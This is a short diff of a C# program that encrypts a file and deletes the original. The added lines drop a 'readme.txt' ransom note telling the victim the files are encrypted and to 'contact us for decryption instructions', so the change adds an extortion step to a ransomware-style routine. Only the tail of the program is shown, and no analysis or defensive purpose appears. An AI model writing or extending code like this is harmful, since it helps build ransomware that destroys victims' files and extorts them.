@@ -92,7 +92,11 @@ class Program
             // Delete the original file
             File.Delete(filePath);
 
-            Console.WriteLine($"Encryption completed. Original file deleted. Encrypted data saved to {outputFile}");
+            // Create and write to a text file with a custom message
+            string messageFilePath = Path.Combine(Path.GetDirectoryName(filePath), "readme.txt");
+            File.WriteAllText(messageFilePath, "Your files have been encrypted. Please contact us for decryption instructions.");
+
+            Console.WriteLine($"Encryption completed. Original file deleted. Encrypted data saved to {outputFile}. Readme file created at {messageFilePath}");
         }
     }
 }
